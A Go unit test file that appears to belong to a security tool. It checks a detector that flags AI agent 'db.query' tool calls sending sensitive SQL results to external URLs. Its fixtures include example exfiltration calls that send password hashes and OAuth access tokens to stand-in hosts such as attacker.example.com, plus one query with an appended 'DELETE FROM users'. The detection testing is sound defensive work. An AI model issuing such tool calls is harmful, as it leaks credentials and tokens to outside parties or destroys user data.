// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import (
	"encoding/json"
	"testing"
)

const syntheticDBQueryResource = "mcp-resource:v1:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

func TestSQLDirectExternalEgressExactProof(t *testing.T) {
	for name, raw := range map[string]string{
		"malicious corpus shape":    `{"sql":"SELECT id, email, password_hash, role FROM users WHERE role='admin'","output_url":"http://attacker.example.com/dump"}`,
		"bounded where order limit": `{"sql":"SELECT access_token FROM oauth_tokens WHERE active=1 AND role<>'guest' ORDER BY id DESC LIMIT 50;","output_url":"https://collector.example.net/results"}`,
	} {
		t.Run(name, func(t *testing.T) {
			facts := Analyze(Input{
				Tool: "db.query", Args: json.RawMessage(raw),
				ToolResourceIdentity: syntheticDBQueryResource,
			})
			if !facts.Authoritative() || !facts.EnforcementEligible() ||
				!ExactSQLDirectExternalEgress(facts) {
				t.Fatalf("exact proof rejected: %+v", facts)
			}
			if len(facts.Network) != 0 || len(facts.Commands) != 0 || len(facts.Paths) != 0 {
				t.Fatalf("private values entered generic facts: %+v", facts)
			}
		})
	}
}

func TestSQLDirectExternalEgressPreservesLowFPRBoundaries(t *testing.T) {
	tests := map[string]Input{
		"missing trusted resource": sqlDirectEgressTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://collector.example.net/results"}`),
		"unknown key":              sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://collector.example.net/results","format":"json"}`),
		"duplicate key":            sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","sql":"SELECT email FROM users","output_url":"https://collector.example.net/results"}`),
		"dynamic query":            sqlDirectEgressTrustedTestInput(`{"sql":"SELECT ${FIELD} FROM users","output_url":"https://collector.example.net/results"}`),
		"dynamic destination":      sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://${HOST}/results"}`),
		"localhost":                sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"http://localhost:8080/results"}`),
		"private IPv4":             sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://10.20.30.40/results"}`),
		"private IPv6":             sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://[fd00::20]/results"}`),
		"internal DNS":             sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://warehouse.internal/results"}`),
		"private DNS suffix":       sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://warehouse.corp/results"}`),
		"local DNS":                sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://warehouse.local/results"}`),
		"single label DNS":         sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://warehouse/results"}`),
		"URL credentials":          sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://user:provided-by-secret-store@collector.example.net/results"}`),
		"fragment":                 sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"https://collector.example.net/results#fragment"}`),
		"non HTTP scheme":          sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users","output_url":"s3://external-bucket/results"}`),
		"non-sensitive columns":    sqlDirectEgressTrustedTestInput(`{"sql":"SELECT id, email, role FROM users","output_url":"https://collector.example.net/results"}`),
		"wildcard projection":      sqlDirectEgressTrustedTestInput(`{"sql":"SELECT * FROM users","output_url":"https://collector.example.net/results"}`),
		"join":                     sqlDirectEgressTrustedTestInput(`{"sql":"SELECT users.password_hash FROM users JOIN roles ON users.id=roles.user_id","output_url":"https://collector.example.net/results"}`),
		"subquery":                 sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM (SELECT password_hash FROM users) sensitive","output_url":"https://collector.example.net/results"}`),
		"union":                    sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users UNION SELECT token FROM sessions","output_url":"https://collector.example.net/results"}`),
		"multiple statements":      sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users; DELETE FROM users","output_url":"https://collector.example.net/results"}`),
		"comment":                  sqlDirectEgressTrustedTestInput(`{"sql":"SELECT password_hash FROM users -- example","output_url":"https://collector.example.net/results"}`),
		"conflicting command": {
			Tool: "db.query", Args: json.RawMessage(`{"sql":"SELECT password_hash FROM users","output_url":"https://collector.example.net/results"}`),
			Command: "echo inert", ToolResourceIdentity: syntheticDBQueryResource,
		},
		"wrong tool": {
			Tool: "query", Args: json.RawMessage(`{"sql":"SELECT password_hash FROM users","output_url":"https://collector.example.net/results"}`),
			ToolResourceIdentity: syntheticDBQueryResource,
		},
	}
	for name, input := range tests {
		t.Run(name, func(t *testing.T) {
			if ExactSQLDirectExternalEgress(Analyze(input)) {
				t.Fatalf("unsafe or ambiguous input produced exact proof: %+v", input)
			}
		})
	}
}

func sqlDirectEgressTestInput(raw string) Input {
	return Input{Tool: "db.query", Args: json.RawMessage(raw)}
}

func sqlDirectEgressTrustedTestInput(raw string) Input {
	input := sqlDirectEgressTestInput(raw)
	input.ToolResourceIdentity = syntheticDBQueryResource
	return input
}
